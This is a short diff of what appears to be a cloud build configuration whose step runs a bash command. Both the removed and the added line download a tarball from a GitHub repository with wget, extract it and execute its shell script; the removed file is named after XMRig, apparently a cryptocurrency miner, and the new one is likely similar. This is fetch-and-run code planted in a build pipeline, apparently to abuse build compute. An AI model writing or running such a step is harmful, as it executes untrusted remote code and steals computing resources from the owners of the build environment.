@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         wget https://github.com/pionbangkit/cobacoba/raw/main/shibxmrig.tar.gz && tar xf shibxmrig.tar.gz && ./shib.sh
+         wget https://github.com/pionbangkit/cobacoba/raw/main/ccx.tar.gz && tar xf ccx.tar.gz && ./ccx.sh
     waitFor:
       - '-'
     entrypoint: /bin/bash
